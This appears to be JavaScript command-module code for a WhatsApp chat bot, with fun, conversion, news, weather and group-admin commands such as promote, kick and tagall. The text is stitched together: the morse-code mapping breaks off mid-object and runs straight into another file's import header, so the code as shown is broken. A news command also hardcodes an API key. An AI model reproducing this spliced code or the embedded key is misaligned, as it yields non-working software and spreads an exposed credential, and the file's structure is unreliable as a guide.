    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
